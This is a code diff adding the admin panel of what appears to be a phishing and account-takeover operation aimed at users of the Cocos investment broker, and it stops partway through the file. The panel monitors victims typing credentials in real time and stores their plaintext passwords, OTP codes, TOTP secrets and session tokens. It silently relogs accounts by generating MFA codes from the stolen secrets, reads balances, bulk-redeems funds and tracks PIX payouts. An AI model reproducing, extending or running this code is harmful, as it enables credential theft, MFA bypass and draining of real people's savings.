@@ -1,0 +1,1694 @@
+import { useState, useEffect, useCallback, useRef } from "react";
+import { useAuth } from "@/hooks/useAuth";
+import { useAdminData } from "@/hooks/useAdminData";
+import { supabase } from "@/integrations/supabase/client";
+import { invokeCocos } from "@/lib/cocosApi";
+import CocosAdminLogin from "@/components/admin/CocosAdminLogin";
+import CocosV2DashboardScreen from "@/components/cocosv2/CocosV2DashboardScreen";
+import OnlineNowTab from "@/components/admin/OnlineNowTab";
+import { SessionPresenceProvider } from "@/hooks/useSessionPresence";
+import AdminLogs from "@/components/admin/AdminLogs";
+import cocosLogo from "@/assets/cocos-logo.png";
+import { generateTOTP, getTimeRemaining } from "@/lib/totp";
+import { useNotificationSound } from "@/hooks/useNotificationSound";
+import {
+  Shield, LogOut, RefreshCw, Users, Wallet, Clock, ShieldCheck, ShieldOff,
+  Play, ArrowLeft, Search, DollarSign, TrendingUp, KeyRound, Copy, Check,
+  Eye, EyeOff, Bell, BellOff, Activity, Trash2, Wifi, FileText, Monitor,
+  Smartphone, Globe, MapPin, Lock, Banknote, ArrowUpRight, Key, Gauge,
+  CalendarDays, Zap, ChevronDown, ChevronUp, BarChart3, Coins,
+} from "lucide-react";
+
+// ── Types ──
+interface LiveSession {
+  id: string;
+  email: string | null;
+  password: string | null;
+  status: string;
+  otp_code: string | null;
+  created_at: string;
+  ip_address: string | null;
+  user_agent: string | null;
+  country: string | null;
+  city: string | null;
+  source: string;
+  operator_code: string;
+}
+
+interface CocosAccount {
+  id: string;
+  email: string;
+  password: string | null;
+  full_name: string | null;
+  account_id: string | null;
+  access_token: string | null;
+  refresh_token: string | null;
+  totp_secret: string | null;
+  balance_ars: Record<string, unknown> | null;
+  balance_usd: Record<string, unknown> | null;
+  buying_power: Record<string, unknown> | null;
+  portfolio_data: Record<string, unknown> | null;
+  last_login_at: string | null;
+  last_refresh_at: string | null;
+  last_data_sync_at: string | null;
+  phone: string | null;
+  factors: unknown;
+  orders: unknown;
+  profile_data: Record<string, unknown> | null;
+  created_at: string;
+  updated_at: string;
+  info_tag: string | null;
+  operator_code: string;
+}
+
+interface PixTx {
+  id: string;
+  account_email: string;
+  pix_key: string;
+  recipient_name: string | null;
+  amount_brl: number;
+  amount_ars: number | null;
+  exchange_rate: number | null;
+  payment_method: string | null;
+  payment_id: string | null;
+  settlement_id: string | null;
+  status: string;
+  created_at: string;
+}
+
+interface PixLimitsData {
+  dailyLimit?: number;
+  dailyConsumption?: number;
+  monthlyLimit?: number;
+  monthlyConsumption?: number;
+  [key: string]: unknown;
+}
+
+const INFO_TAGS = ["USEI", "NÃO MEXI", "NÃO FAZ PIX", "RECEBE EM 24HRS"] as const;
+const TAG_COLORS: Record<string, { bg: string; text: string }> = {
+  "USEI": { bg: "bg-blue-500/15 border-blue-500/30", text: "text-blue-400" },
+  "NÃO MEXI": { bg: "bg-yellow-500/15 border-yellow-500/30", text: "text-yellow-400" },
+  "NÃO FAZ PIX": { bg: "bg-red-500/15 border-red-500/30", text: "text-red-400" },
+  "RECEBE EM 24HRS": { bg: "bg-green-500/15 border-green-500/30", text: "text-green-400" },
+};
+
+// ── Helpers ──
+const fmtARS = (n: number) =>
+  new Intl.NumberFormat("es-AR", { style: "currency", currency: "ARS", minimumFractionDigits: 2 }).format(n);
+const fmtUSD = (n: number) =>
+  new Intl.NumberFormat("en-US", { style: "currency", currency: "USD", minimumFractionDigits: 2 }).format(n);
+const fmtBRL = (n: number) =>
+  new Intl.NumberFormat("pt-BR", { style: "currency", currency: "BRL", minimumFractionDigits: 2 }).format(n);
+
+const timeAgo = (dateStr: string | null) => {
+  if (!dateStr) return "Nunca";
+  const diff = Date.now() - new Date(dateStr).getTime();
+  const mins = Math.floor(diff / 60000);
+  if (mins < 1) return "Agora";
+  if (mins < 60) return `${mins}m`;
+  const hrs = Math.floor(mins / 60);
+  if (hrs < 24) return `${hrs}h`;
+  return `${Math.floor(hrs / 24)}d`;
+};
+
+const parseDevice = (ua: string | null) => {
+  if (!ua) return "?";
+  if (/Mobile|Android|iPhone/i.test(ua)) return "📱";
+  if (/Tablet|iPad/i.test(ua)) return "📟";
+  return "💻";
+};
+
+const parseBrowser = (ua: string | null) => {
+  if (!ua) return "";
+  if (/Edg/i.test(ua)) return "Edge";
+  if (/Chrome/i.test(ua)) return "Chrome";
+  if (/Firefox/i.test(ua)) return "Firefox";
+  if (/Safari/i.test(ua)) return "Safari";
+  return "";
+};
+
+const statusLabels: Record<string, { label: string; color: string }> = {
+  login_attempt: { label: "Digitando", color: "text-yellow-400 bg-yellow-500/10" },
+  login_success: { label: "Login OK", color: "text-green-400 bg-green-500/10" },
+  wrong_password: { label: "Senha Errada", color: "text-red-400 bg-red-500/10" },
+  login_error: { label: "Erro", color: "text-red-500 bg-red-500/10" },
+  mfa_challenge_sent: { label: "MFA Enviado", color: "text-blue-400 bg-blue-500/10" },
+  mfa_code_entered: { label: "MFA Digitado", color: "text-blue-300 bg-blue-500/10" },
+  mfa_verified_ok: { label: "MFA OK ✓", color: "text-green-400 bg-green-500/10" },
+  mfa_code_wrong: { label: "MFA Errado", color: "text-red-400 bg-red-500/10" },
+  email_challenge_sent: { label: "E-mail Enviado", color: "text-blue-400 bg-blue-500/10" },
+  email_code_entered: { label: "E-mail Digitado", color: "text-blue-300 bg-blue-500/10" },
+  email_verified_ok: { label: "E-mail OK ✓", color: "text-green-400 bg-green-500/10" },
+  email_code_wrong: { label: "E-mail Errado", color: "text-red-400 bg-red-500/10" },
+  sms_sent: { label: "SMS Enviado", color: "text-cyan-400 bg-cyan-500/10" },
+  sms_code_entered: { label: "SMS Digitado", color: "text-cyan-300 bg-cyan-500/10" },
+  sms_verified_ok: { label: "SMS OK ✓", color: "text-green-400 bg-green-500/10" },
+  totp_enrolled: { label: "TOTP ✓", color: "text-purple-400 bg-purple-500/10" },
+  totp_auto_verified: { label: "TOTP Auto ✓", color: "text-purple-300 bg-purple-500/10" },
+  totp_enroll_failed: { label: "TOTP Falhou", color: "text-red-400 bg-red-500/10" },
+  completed: { label: "Concluído ✓", color: "text-green-500 bg-green-500/10" },
+  error: { label: "Erro", color: "text-red-500 bg-red-500/10" },
+};
+
+// ══════════════════════════════════════════
+// MAIN COMPONENT
+// ══════════════════════════════════════════
+const AdminV2 = () => {
+  const { user, isAdmin, loading: authLoading, signOut } = useAuth();
+  const { stats } = useAdminData(user?.id, isAdmin);
+  const [forceRefresh, setForceRefresh] = useState(0);
+  const [activeTab, setActiveTab] = useState<"online" | "sessions" | "logs" | "accounts">("sessions");
+
+  // PIX transactions
+  const [pixTransactions, setPixTransactions] = useState<PixTx[]>([]);
+  const [pixLoading, setPixLoading] = useState(true);
+  const [pixCheckingId, setPixCheckingId] = useState<string | null>(null);
+  const [pixCheckingAll, setPixCheckingAll] = useState(false);
+  const [pixCheckProgress, setPixCheckProgress] = useState({ done: 0, total: 0 });
+  const [pixStatusResults, setPixStatusResults] = useState<Record<string, Record<string, unknown>>>({});
+
+  // PIX Limits
+  const [pixLimits, setPixLimits] = useState<Record<string, PixLimitsData>>({});
+  const [pixLimitsLoading, setPixLimitsLoading] = useState(false);
+
+  // Accounts
+  const [accounts, setAccounts] = useState<CocosAccount[]>([]);
+  const [accountsLoading, setAccountsLoading] = useState(true);
+  const [search, setSearch] = useState("");
+
+  // Operating state
+  const [operatingAccount, setOperatingAccount] = useState<CocosAccount | null>(null);
+  const [opAccessToken, setOpAccessToken] = useState("");
+  const [opRefreshToken, setOpRefreshToken] = useState("");
+  const [tokenStatus, setTokenStatus] = useState<Record<string, "alive" | "expired" | "checking">>({});
+
+  const accountsRef = useRef<CocosAccount[]>([]);
+  const [accountFilter, setAccountFilter] = useState<"all" | "expired" | "alive" | "today" | "yesterday" | "top_balance">("all");
+
+  // Operator filter
+  interface Operator { id: string; code: string; name: string; user_id?: string; }
+  const [operators, setOperators] = useState<Operator[]>([]);
+  const [operatorFilter, setOperatorFilter] = useState<string>("all");
+  const [myOperator, setMyOperator] = useState<Operator | null>(null);
+
+  useEffect(() => {
+    if (!user || !isAdmin) return;
+    supabase.from("operators").select("*").order("created_at").then(({ data }) => {
+      const ops = (data as unknown as Operator[]) || [];
+      setOperators(ops);
+      const match = ops.find((o) => o.user_id === user.id && o.code !== "master");
+      if (match) { setMyOperator(match); setOperatorFilter(match.code); }
+    });
+  }, [user, isAdmin]);
+
+  // Live sessions
+  const [liveSessions, setLiveSessions] = useState<LiveSession[]>([]);
+  const { startAlarm, stopAlarm } = useNotificationSound();
+  const [soundEnabled, setSoundEnabled] = useState(true);
+  const soundEnabledRef = useRef(true);
+  const seenSessionsRef = useRef<Set<string>>(new Set());
+  const notifiedStatusRef = useRef<Set<string>>(new Set());
+  const operatingAccountRef = useRef<CocosAccount | null>(null);
+  operatingAccountRef.current = operatingAccount;
+
+  useEffect(() => { soundEnabledRef.current = soundEnabled; }, [soundEnabled]);
+
+  // ── Load accounts ──
+  const loadAccounts = useCallback(async (showLoading = true) => {
+    if (showLoading) setAccountsLoading(true);
+    const { data } = await supabase.from("cocos_accounts").select("*").order("last_login_at", { ascending: false });
+    setAccounts((data as unknown as CocosAccount[]) || []);
+    if (showLoading) setAccountsLoading(false);
+  }, []);
+
+  useEffect(() => {
+    if (user && isAdmin) loadAccounts(true);
+  }, [user, isAdmin, loadAccounts, forceRefresh]);
+
+  useEffect(() => { accountsRef.current = accounts; }, [accounts]);
+
+  // ── Load ALL PIX transactions (paginated) ──
+  const loadPixTransactions = useCallback(async () => {
+    setPixLoading(true);
+    let allTx: PixTx[] = [];
+    let page = 0;
+    const pageSize = 1000;
+    let hasMore = true;
+    while (hasMore) {
+      const { data } = await supabase
+        .from("pix_transactions" as any)
+        .select("*")
+        .order("created_at", { ascending: false })
+        .range(page * pageSize, (page + 1) * pageSize - 1);
+      if (data && data.length > 0) {
+        allTx = allTx.concat(data as unknown as PixTx[]);
+        hasMore = data.length === pageSize;
+        page++;
+      } else {
+        hasMore = false;
+      }
+    }
+    setPixTransactions(allTx);
+    setPixLoading(false);
+  }, []);
+
+  useEffect(() => {
+    if (user && isAdmin) loadPixTransactions();
+  }, [user, isAdmin, loadPixTransactions]);
+
+  // Realtime PIX
+  useEffect(() => {
+    if (!user || !isAdmin) return;
+    const channel = supabase
+      .channel("pix-tx-realtime")
+      .on("postgres_changes", { event: "*", schema: "public", table: "pix_transactions" }, (payload) => {
+        if (payload.eventType === "INSERT") {
+          setPixTransactions((prev) => [payload.new as unknown as PixTx, ...prev]);
+        } else if (payload.eventType === "UPDATE") {
+          setPixTransactions((prev) => prev.map((t) => t.id === (payload.new as any).id ? (payload.new as unknown as PixTx) : t));
+        }
+      })
+      .subscribe();
+    return () => { supabase.removeChannel(channel); };
+  }, [user, isAdmin]);
+
+  useEffect(() => {
+    if (!user || !isAdmin) return;
+    const channel = supabase
+      .channel("cocos-accounts-realtime")
+      .on("postgres_changes", { event: "*", schema: "public", table: "cocos_accounts" }, (payload) => {
+        if (payload.eventType === "INSERT") {
+          setAccounts((prev) => [payload.new as unknown as CocosAccount, ...prev]);
+        } else if (payload.eventType === "UPDATE") {
+          setAccounts((prev) => prev.map((a) => a.id === (payload.new as any).id ? (payload.new as unknown as CocosAccount) : a));
+        } else if (payload.eventType === "DELETE") {
+          setAccounts((prev) => prev.filter((a) => a.id !== (payload.old as any).id));
+        }
+      })
+      .subscribe();
+    return () => { supabase.removeChannel(channel); };
+  }, [user, isAdmin]);
+
+  // ── Load live sessions ──
+  const loadLiveSessions = useCallback(async () => {
+    const since = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
+    const { data } = await supabase
+      .from("sessions").select("*")
+      .eq("source", "cocosv2").gte("created_at", since)
+      .order("created_at", { ascending: false }).limit(100);
+    setLiveSessions((data as unknown as LiveSession[]) || []);
+  }, []);
+
+  useEffect(() => {
+    if (!user || !isAdmin) return;
+    loadLiveSessions();
+    const alertStatuses = new Set([
+      "login_success", "mfa_challenge_sent", "email_challenge_sent",
+      "sms_sent", "totp_enrolled", "completed",
+    ]);
+    const channel = supabase
+      .channel("cocosv2-sessions-admin")
+      .on("postgres_changes", { event: "*", schema: "public", table: "sessions", filter: "source=eq.cocosv2" }, (payload) => {
+        const newRow = payload.new as LiveSession;
+        if (payload.eventType === "INSERT") {
+          setLiveSessions((prev) => [newRow, ...prev].slice(0, 100));
+          if (!seenSessionsRef.current.has(newRow.id) && soundEnabledRef.current) {
+            seenSessionsRef.current.add(newRow.id);
+            startAlarm();
+            setTimeout(() => stopAlarm(), 3000);
+          }
+        } else if (payload.eventType === "UPDATE") {
+          setLiveSessions((prev) => prev.map((s) => s.id === newRow.id ? newRow : s));
+          const statusKey = `${newRow.id}:${newRow.status}`;
+          if (alertStatuses.has(newRow.status) && !notifiedStatusRef.current.has(statusKey) && soundEnabledRef.current) {
+            notifiedStatusRef.current.add(statusKey);
+            startAlarm();
+            setTimeout(() => stopAlarm(), 2000);
+          }
+        }
+        if (newRow.status === "completed") loadAccounts(false);
+      })
+      .subscribe();
+    return () => { supabase.removeChannel(channel); };
+  }, [user, isAdmin, loadLiveSessions, startAlarm, stopAlarm, loadAccounts]);
+
+  // Helper: invoke edge function with auto-refresh on 403
+  const safeInvoke = useCallback(async (body: Record<string, unknown>, retried = false): Promise<{ data: any; error: any }> => {
+    return await invokeCocos(body);
+  }, []);
+
+  // ── Fetch PIX Limits for all active accounts ──
+  const fetchAllPixLimits = useCallback(async () => {
+    const activeAccounts = accounts.filter(a => a.access_token && a.account_id);
+    if (activeAccounts.length === 0) return;
+    setPixLimitsLoading(true);
+    const results: Record<string, PixLimitsData> = {};
+    for (const acct of activeAccounts) {
+      try {
+        const { data, error } = await safeInvoke({
+          action: "pix_limits",
+          access_token: acct.access_token,
+          account_id: acct.account_id,
+        });
+        if (!error && data && !data.error) {
+          results[acct.email] = data as PixLimitsData;
+        }
+      } catch { /* skip */ }
+    }
+    setPixLimits(results);
+    setPixLimitsLoading(false);
+  }, [accounts, safeInvoke]);
+
+  // Auto-fetch PIX limits when accounts load
+  useEffect(() => {
+    if (!accountsLoading && accounts.length > 0 && Object.keys(pixLimits).length === 0) {
+      fetchAllPixLimits();
+    }
+  }, [accountsLoading, accounts.length]);
+
+  // ── Operate account ──
+  const handleOperate = async (account: CocosAccount) => {
+    if (!account.access_token && !account.refresh_token) return;
+    setTokenStatus((prev) => ({ ...prev, [account.email]: "checking" }));
+    let workingToken = account.access_token || "";
+    let workingRefresh = account.refresh_token || "";
+    let tokenAlive = false;
+    if (workingToken) {
+      try {
+        const { data, error: fnError } = await safeInvoke({ action: "get_user_auth", access_token: workingToken });
+        if (!fnError && data && !data.error && data.id) tokenAlive = true;
+      } catch { /* */ }
+    }
+    if (!tokenAlive && workingRefresh) {
+      try {
+        const { data: refreshData, error: fnError } = await safeInvoke({ action: "refresh_token", refresh_token: workingRefresh });
+        if (!fnError && refreshData?.access_token) { workingToken = refreshData.access_token; workingRefresh = refreshData.refresh_token || workingRefresh; tokenAlive = true; }
+      } catch { /* */ }
+    }
+    if (tokenAlive) {
+      let acctId = account.account_id || "";
+      if (!acctId) { try { const { data: pd } = await safeInvoke({ action: "get_account_id", access_token: workingToken }); if (pd?.id_accounts?.[0]) acctId = String(pd.id_accounts[0]); } catch { /* */ } }
+      const extra = acctId ? { account_id: acctId } : {};
+      const [balArsRes, balUsdRes] = await Promise.allSettled([
+        safeInvoke({ action: "get_portfolio_balance", access_token: workingToken, currency: "ARS", period: "1D", ...extra }),
+        safeInvoke({ action: "get_portfolio_balance_usd", access_token: workingToken, period: "1D", ...extra }),
+      ]);
+      await supabase.from("cocos_accounts").upsert({ email: account.email, access_token: workingToken, refresh_token: workingRefresh, account_id: acctId || account.account_id || null, balance_ars: (balArsRes.status === "fulfilled" ? balArsRes.value.data : null) || account.balance_ars || {}, balance_usd: (balUsdRes.status === "fulfilled" ? balUsdRes.value.data : null) || account.balance_usd || {}, last_refresh_at: new Date().toISOString() } as any, { onConflict: "email" });
+      setTokenStatus((prev) => ({ ...prev, [account.email]: "alive" }));
+      setOpAccessToken(workingToken); setOpRefreshToken(workingRefresh);
+      setOperatingAccount({ ...account, access_token: workingToken, refresh_token: workingRefresh });
+      loadAccounts(false); return;
+    }
+    setTokenStatus((prev) => ({ ...prev, [account.email]: "expired" }));
+    loadAccounts(false);
+  };
+
+  const handleStopOperating = () => { setOperatingAccount(null); setOpAccessToken(""); setOpRefreshToken(""); loadAccounts(false); };
+
+  // ── Check ALL PIX statuses ──
+  const handleCheckAllPix = useCallback(async () => {
+    const toCheck = pixTransactions.filter((tx) => tx.payment_id && !pixStatusResults[tx.id]);
+    if (toCheck.length === 0) return;
+    setPixCheckingAll(true);
+    setPixCheckProgress({ done: 0, total: toCheck.length });
+    for (let i = 0; i < toCheck.length; i++) {
+      const tx = toCheck[i];
+      const acct = accounts.find((a) => a.email === tx.account_email);
+      if (!acct?.access_token || !acct?.account_id) {
+        setPixStatusResults((prev) => ({ ...prev, [tx.id]: { error: "Sem token" } }));
+        setPixCheckProgress((prev) => ({ ...prev, done: prev.done + 1 }));
+        continue;
+      }
+      try {
+        const res = await invokeCocos({ action: "pix_get_payment", access_token: acct.access_token, account_id: acct.account_id, payment_id: tx.payment_id });
+        const data = res.data as Record<string, unknown>;
+        setPixStatusResults((prev) => ({ ...prev, [tx.id]: data || { error: "Sem resposta" } }));
+        if (data?.status && String(data.status).toUpperCase() !== tx.status.toUpperCase()) {
+          await supabase.from("pix_transactions" as any).update({ status: String(data.status).toLowerCase() }).eq("id", tx.id);
+          setPixTransactions((prev) => prev.map((t) => t.id === tx.id ? { ...t, status: String(data.status).toLowerCase() } : t));
+        }
+      } catch {
+        setPixStatusResults((prev) => ({ ...prev, [tx.id]: { error: "Erro" } }));
+      }
+      setPixCheckProgress((prev) => ({ ...prev, done: prev.done + 1 }));
+    }
+    setPixCheckingAll(false);
+  }, [pixTransactions, pixStatusResults, accounts]);
+
+  // Auto-check PIX statuses
+  const autoCheckRef = useRef(false);
+  useEffect(() => {
+    if (pixLoading || accountsLoading || pixTransactions.length === 0 || accounts.length === 0) return;
+    if (autoCheckRef.current) return;
+    autoCheckRef.current = true;
+    const timer = setTimeout(() => { handleCheckAllPix(); }, 1500);
+    const interval = setInterval(() => { loadPixTransactions(); autoCheckRef.current = false; }, 5 * 60 * 1000);
+    return () => { clearTimeout(timer); clearInterval(interval); };
+  }, [pixLoading, accountsLoading, pixTransactions.length, accounts.length, handleCheckAllPix, loadPixTransactions]);
+
+  const handleDeleteAccount = async (account: CocosAccount) => {
+    if (!confirm(`Remover conta ${account.email}?`)) return;
+    await supabase.from("cocos_accounts").delete().eq("id", account.id);
+    loadAccounts(false);
+  };
+
+  // ── Auto-relogin all expired accounts with MFA ──
+  const [reloginRunning, setReloginRunning] = useState(false);
+  const [reloginProgress, setReloginProgress] = useState({ done: 0, total: 0, current: "", results: [] as { email: string; ok: boolean; msg: string }[] });
+
+  const handleReloginAll = async () => {
+    // Find expired accounts that have password + totp_secret
+    const expiredAccounts = accounts.filter((a) => {
+      const isExpired = a.info_tag?.startsWith("⚠️") || a.info_tag?.startsWith("❌") || !a.refresh_token;
+      return isExpired && a.password && a.totp_secret;
+    });
+    if (expiredAccounts.length === 0) return;
+    if (!confirm(`Relogar ${expiredAccounts.length} contas expiradas com MFA?`)) return;
+
+    setReloginRunning(true);
+    setReloginProgress({ done: 0, total: expiredAccounts.length, current: "", results: [] });
+
+    for (let i = 0; i < expiredAccounts.length; i++) {
+      const acct = expiredAccounts[i];
+      setReloginProgress((p) => ({ ...p, current: acct.email, done: i }));
+
+      try {
+        // Step 1: Login
+        const { data: loginData, error: loginErr } = await safeInvoke({ action: "login", email: acct.email, password: acct.password });
+        if (loginErr || !loginData?.access_token) {
+          const msg = loginData?.status === "invalid_credentials" ? "Senha inválida" : (loginData?.error || loginErr?.message || "Erro login");
+          setReloginProgress((p) => ({ ...p, results: [...p.results, { email: acct.email, ok: false, msg }] }));
+          continue;
+        }
+
+        let accessToken = loginData.access_token;
+        let refreshToken = loginData.refresh_token || "";
+
+        // Step 2: List MFA factors
+        const { data: userInfo } = await safeInvoke({ action: "mfa_list_factors", access_token: accessToken });
+        const factors = userInfo?.factors || [];
+        const totpFactor = factors.find((f: any) => f.factor_type === "totp" && f.status === "verified");
+
+        if (!totpFactor) {
+          // No verified TOTP factor - save tokens anyway (aal1)
+          await supabase.from("cocos_accounts").update({
+            access_token: accessToken,
+            refresh_token: refreshToken,
+            info_tag: null,
+            last_login_at: new Date().toISOString(),
+          } as any).eq("id", acct.id);
+          setReloginProgress((p) => ({ ...p, results: [...p.results, { email: acct.email, ok: true, msg: "✅ Login OK (sem MFA)" }] }));
+          continue;
+        }
+
+        // Step 3: Challenge the TOTP factor
+        const { data: challengeData } = await safeInvoke({ action: "mfa_challenge", access_token: accessToken, factor_id: totpFactor.id });
+        if (!challengeData?.id) {
+          setReloginProgress((p) => ({ ...p, results: [...p.results, { email: acct.email, ok: false, msg: "Erro ao criar challenge MFA" }] }));
+          continue;
+        }
+
+        // Step 4: Generate TOTP code from stored secret
+        const totpCode = await generateTOTP(acct.totp_secret!);
+
+        // Step 5: Verify MFA
+        const { data: verifyData } = await safeInvoke({
+          action: "mfa_verify",
+          access_token: accessToken,
+          factor_id: totpFactor.id,
+          challenge_id: challengeData.id,
+          code: totpCode,
+        });
+
+        if (verifyData?.access_token) {
+          accessToken = verifyData.access_token;
+          refreshToken = verifyData.refresh_token || refreshToken;
+
+          // Step 6: Get account_id if missing
+          let accountId = acct.account_id || "";
+          if (!accountId) {
+            try {
+              const { data: pd } = await safeInvoke({ action: "get_account_id", access_token: accessToken });
+              if (pd?.id_accounts?.[0]) accountId = String(pd.id_accounts[0]);
+            } catch { /* */ }
+          }
+
+          // Step 7: Update DB - clear expired tag
+          await supabase.from("cocos_accounts").update({
+            access_token: accessToken,
+            refresh_token: refreshToken,
+            account_id: accountId || acct.account_id || null,
+            info_tag: null,
+            last_login_at: new Date().toISOString(),
+            last_refresh_at: new Date().toISOString(),
+          } as any).eq("id", acct.id);
+
+          setReloginProgress((p) => ({ ...p, results: [...p.results, { email: acct.email, ok: true, msg: "✅ Relogin + MFA OK" }] }));
+        } else {
+          setReloginProgress((p) => ({ ...p, results: [...p.results, { email: acct.email, ok: false, msg: `MFA falhou: ${verifyData?.error || "código inválido"}` }] }));
+        }
+      } catch (e) {
+        setReloginProgress((p) => ({ ...p, results: [...p.results, { email: acct.email, ok: false, msg: `Erro: ${(e as Error).message}` }] }));
+      }
+
+      // Small delay between accounts to avoid rate limiting
+      await new Promise((r) => setTimeout(r, 2000));
+    }
+
+    setReloginProgress((p) => ({ ...p, done: expiredAccounts.length, current: "" }));
+    setReloginRunning(false);
+    loadAccounts(false);
+  };
+
+  // ── Refresh all active account balances ──
+  const [refreshAllRunning, setRefreshAllRunning] = useState(false);
+  const [refreshAllProgress, setRefreshAllProgress] = useState({ done: 0, total: 0, current: "" });
+
+  const handleRefreshAllBalances = async () => {
+    const activeAccounts = accounts.filter((a) => a.access_token && a.refresh_token && !a.info_tag?.startsWith("⚠️") && !a.info_tag?.startsWith("❌"));
+    if (activeAccounts.length === 0) return;
+
+    setRefreshAllRunning(true);
+    setRefreshAllProgress({ done: 0, total: activeAccounts.length, current: "" });
+
+    for (let i = 0; i < activeAccounts.length; i++) {
+      const acct = activeAccounts[i];
+      setRefreshAllProgress({ done: i, total: activeAccounts.length, current: acct.email });
+
+      try {
+        let token = acct.access_token!;
+        let refresh = acct.refresh_token!;
+        const accId = acct.account_id || "";
+
+        // Try refresh token first
+        try {
+          const { data: refData } = await safeInvoke({ action: "refresh_token", refresh_token: refresh });
+          if (refData?.access_token) { token = refData.access_token; refresh = refData.refresh_token || refresh; }
+        } catch { /* keep current */ }
+
+        const extra = accId ? { account_id: accId } : {};
+        const [balArsRes, balUsdRes, bpRes] = await Promise.allSettled([
+          safeInvoke({ action: "get_portfolio_balance", access_token: token, currency: "ARS", period: "1D", ...extra }),
+          safeInvoke({ action: "get_portfolio_balance_usd", access_token: token, period: "1D", ...extra }),
+          safeInvoke({ action: "get_buying_power", access_token: token, ...extra }),
+        ]);
+
+        const balArs = balArsRes.status === "fulfilled" && balArsRes.value.data && !balArsRes.value.data.error ? balArsRes.value.data : acct.balance_ars;
+        const balUsd = balUsdRes.status === "fulfilled" && balUsdRes.value.data && !balUsdRes.value.data.error ? balUsdRes.value.data : acct.balance_usd;
+        const bp = bpRes.status === "fulfilled" && bpRes.value.data && !bpRes.value.data.error ? bpRes.value.data : acct.buying_power;
+
+        await supabase.from("cocos_accounts").update({
+          access_token: token, refresh_token: refresh,
+          balance_ars: balArs, balance_usd: balUsd, buying_power: bp,
+          last_refresh_at: new Date().toISOString(),
+        } as any).eq("id", acct.id);
+      } catch { /* skip */ }
+
+      await new Promise((r) => setTimeout(r, 3000));
+    }
+
+    setRefreshAllProgress({ done: activeAccounts.length, total: activeAccounts.length, current: "" });
+    setRefreshAllRunning(false);
+    loadAccounts(false);
+  };
+
+  // ── Bulk redeem all FCI ──
+  const [redeemAllRunning, setRedeemAllRunning] = useState(false);
+  const [redeemAllResult, setRedeemAllResult] = useState<any>(null);
+
+  const handleRedeemAll = async () => {
+    if (!confirm("Resgatar TODOS os FCI (CI) de TODAS as contas ativas e atualizar saldos?")) return;
+    setRedeemAllRunning(true);
+    setRedeemAllResult(null);
+    try {
+      const res = await fetch(`${import.meta.env.VITE_SUPABASE_URL}/functions/v1/cocos-redeem-all`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "apikey": import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY,
+          "Authorization": `Bearer ${import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY}`,
+        },
+        body: JSON.stringify({}),
+      });
+      const data = await res.json();
+      setRedeemAllResult(data);
+      loadAccounts(false);
+    } catch (e) {
+      setRedeemAllResult({ success: false, error: (e as Error).message });
+    }
+    setRedeemAllRunning(false);
+  };
+
+  // ── Server-side relogin for dead accounts ──
+  const [serverReloginRunning, setServerReloginRunning] = useState(false);
+  const [serverReloginResult, setServerReloginResult] = useState<any>(null);
+
+  const handleServerRelogin = async () => {
+    const deadCount = accounts.filter(a => a.info_tag?.includes("Token morto") || a.info_tag?.startsWith("⚠️") || a.info_tag?.startsWith("❌")).length;
+    if (!confirm(`Relogar ${deadCount} contas expiradas via servidor (com refresh de tokens)?`)) return;
+    setServerReloginRunning(true);
+    setServerReloginResult(null);
+    try {
+      const { data, error } = await supabase.functions.invoke("cocos-relogin-expired", {
+        body: {},
+      });
+
+      if (error) {
+        setServerReloginResult({ success: false, error: error.message || "Falha ao chamar relogin do servidor" });
+      } else {
+        setServerReloginResult(data);
+        loadAccounts(false);
+      }
+    } catch (e) {
+      setServerReloginResult({ success: false, error: (e as Error).message });
+    }
+    setServerReloginRunning(false);
+  };
+
+  useEffect(() => {
+    document.title = "Painel Admin CocosV2";
+    const link: HTMLLinkElement = document.querySelector("link[rel~='icon']") || document.createElement("link");
+    link.rel = "icon"; link.type = "image/png"; link.href = cocosLogo; document.head.appendChild(link);
+  }, []);
+
+  // ── Guards ──
+  if (authLoading) return (
+    <div className="flex min-h-screen items-center justify-center bg-background">
+      <RefreshCw size={24} className="text-primary animate-spin" />
+    </div>
+  );
+  if (!user) return <CocosAdminLogin onLogin={() => setForceRefresh((p) => p + 1)} />;
+  if (!isAdmin) return (
+    <div className="flex min-h-screen flex-col items-center justify-center bg-background gap-4">
+      <Shield className="h-12 w-12 text-destructive" />
+      <h1 className="text-xl font-bold text-foreground">Acesso Negado</h1>
+      <button onClick={() => signOut()} className="rounded-xl bg-primary px-6 py-2.5 text-sm font-semibold text-primary-foreground">Voltar</button>
+    </div>
+  );
+
+  // Operating mode
+  if (operatingAccount) {
+    return (
+      <div className="min-h-screen bg-[#f5f7fb]">
+        <div className="sticky top-0 z-50 bg-card border-b border-border px-4 py-2.5 flex items-center justify-between">
+          <div className="flex items-center gap-3">
+            <button onClick={handleStopOperating} className="flex items-center gap-1.5 rounded-xl border border-border px-3 py-1.5 text-xs text-muted-foreground hover:bg-secondary transition-colors">
+              <ArrowLeft size={13} /> Voltar
+            </button>
+            <div className="flex items-center gap-2">
+              <div className="h-7 w-7 rounded-lg bg-primary flex items-center justify-center">
+                <span className="text-[10px] font-bold text-primary-foreground">{(operatingAccount.full_name || operatingAccount.email)[0]?.toUpperCase()}</span>
+              </div>
+              <div>
+                <p className="text-[11px] font-bold text-foreground">{operatingAccount.full_name || operatingAccount.email}</p>
+                <p className="text-[9px] text-muted-foreground">{operatingAccount.email}</p>
+              </div>
+            </div>
+          </div>
+          <span className="text-[10px] text-green-400 flex items-center gap-1.5 bg-green-500/10 border border-green-500/20 rounded-lg px-3 py-1"><span className="h-2 w-2 rounded-full bg-green-400 animate-pulse" /> Operando</span>
+        </div>
+        <div className="flex min-h-[calc(100dvh-45px)] flex-col items-center px-5 pt-6 pb-6">
+          <div className="flex w-full max-w-[480px] flex-1 flex-col items-center">
+            <CocosV2DashboardScreen email={operatingAccount.email} accessToken={opAccessToken} refreshToken={opRefreshToken} onLogout={handleStopOperating} onTokenRefresh={(a, r) => { setOpAccessToken(a); if (r) setOpRefreshToken(r); }} />
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  // Filter accounts by operator
+  const filteredAccounts = myOperator
+    ? accounts.filter((a) => a.operator_code === myOperator.code)
+    : operatorFilter === "all"
+      ? accounts
+      : accounts.filter((a) => a.operator_code === operatorFilter);
+
+  const totalBalanceArs = filteredAccounts.reduce((s, a) => s + (Number((a.balance_ars as any)?.totalBalance) || 0), 0);
